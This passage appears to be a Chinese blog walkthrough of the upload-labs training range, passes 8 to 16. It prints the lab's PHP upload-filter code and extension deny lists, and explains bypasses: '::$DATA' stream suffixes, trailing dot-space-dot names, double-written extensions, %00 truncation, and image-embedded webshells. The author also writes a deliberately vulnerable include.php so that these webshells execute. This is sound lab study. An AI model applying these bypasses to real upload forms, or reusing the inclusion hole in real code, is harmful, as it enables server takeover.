class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源代码缺少<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code>限制，可以文件名后缀增加<code>::$DATA</code>绕过</p>
<ul>
<li>Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 <code>a.asp</code> 本身的数据，如果a.asp 还包含了其他的数据流，比如 <code>a.asp:lake2.asp</code>，请求 <code>a.asp:lake2.asp::$DATA</code>，则是请求<code>a.asp</code>中的流数据<code>lake2.asp</code>的流数据内容。</li>
</ul>
<p><a href="https://www.freebuf.com/column/143101.html" target="_blank" rel="noopener">NTFS文件流实际应用</a></p>
<ul>
<li>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$DATA</code>。访问时去除后缀</li>
</ul>
<p><img src="/2020/03/08/upload-labs/21.png" alt><br><img src="/2020/03/08/upload-labs/22.png" alt></p>
<h1 id="pass-9"><a href="#pass-9" class="headerlink" title="pass-9"></a>pass-9</h1><p>查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过对比发现15行和之前不太一样，路径拼接的是处理后的文件名，于是构造phpinfo.php. . </p>
<p> （点+空格+点），经过处理后，文件名变成phpinfo.php. .即可绕过。<br><img src="/2020/03/08/upload-labs/23.png" alt><br>上传成功<br><img src="/2020/03/08/upload-labs/24.png" alt></p>
<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><p>查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>只对文件后缀名进行一次过滤，双写文件名绕过。<br><img src="/2020/03/08/upload-labs/25.png" alt><br>上传成功<br><img src="/2020/03/08/upload-labs/26.png" alt><br><img src="/2020/03/08/upload-labs/27.png" alt></p>
<p>今天就先做一半，剩下的明天解决。</p>
<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><p>查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure>

<p>截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态<br><img src="/2020/03/08/upload-labs/1.jpg" alt></p>
<p>但是我们PHP版本太高，多以没有办法复现</p>
<h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。<br><img src="/2020/03/08/upload-labs/2.jpg" alt></p>
<h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可</p>
<p><img src="/2020/03/08/upload-labs/3.jpg" alt></p>
<p>最后保存的时候的路径是不可操作的，所以传上去还是个图片文件，不能解析。这里需要我们自己写个文件包含的代码来配合一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/08/upload-labs/4.jpg" alt><br><img src="/2020/03/08/upload-labs/5.jpg" alt></p>
<p>成功解析</p>
<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现多了一个getimagesize函数，getimagesize就是个获取图片信息的文件。同样我们也可以通过上面的方法绕过,也成功解析<br><img src="/2020/03/08/upload-labs/6.jpg" alt></p>
<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现开启了php_exif模块检测文件信息<br>用上面的文件包含依然可以解析图片</p>
<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面获取了图片的各种信息，下面只是对图片的不同类型进行了相应的处理，过滤的非常严了，还使用了imagecreatefromjpeg()、imagecreatefrompng()、imagecreatefromgif()对图片进行二次渲染重新创建，那么我们传上去的图片可能和这些函数创建出来的图片有所差别，所以在插马的时候需要寻找二次渲染之后不会被修改的地方。<br>如果想要绕过二次渲染的话，就要搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同</p>
<p>参考链接:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p>
<p>于是我们可以将木马写在没有被更改的地方，然后使用文件包含</p>
